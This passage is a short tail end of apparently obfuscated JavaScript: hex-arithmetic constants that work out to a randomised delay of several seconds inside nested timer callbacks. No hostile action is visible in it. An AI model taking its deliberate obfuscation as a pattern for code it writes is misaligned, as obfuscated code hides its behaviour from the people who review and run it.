  }, (-0x2a2f + -0x933 + 0x4eba) * getRandomInt(-0x3bd + 0x2f6 * -0x1 + 0x6b4, 0x1a91 + 0x9a1 + 0x157 * -0x1b));
}, -0x1ec0 + -0x1 * -0x1423 + 0xb01);